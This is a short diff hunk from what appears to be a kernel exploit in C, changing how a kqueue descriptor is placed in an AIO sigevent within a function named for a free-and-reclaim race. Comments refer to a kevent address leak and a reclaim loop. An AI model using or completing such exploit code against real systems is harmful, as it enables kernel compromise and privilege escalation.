@@ -5817,7 +5817,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         tcb.aio_offset = 0;
         tcb.aio_lio_opcode = LIO_READ;
         tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;       // v27: kevent for addr leak
-        tcb.aio_sigevent.sigev_notify_kqueue = kq;
+        tcb.aio_sigevent.sigev_signo = kq;                // kqueue fd in signo field
         // sigev_value = 0 → ext[0]=0 in cached kevent (v18 confirmed)
 
         for (int i = 0; i < AIO_NRECLAIM; i++) {
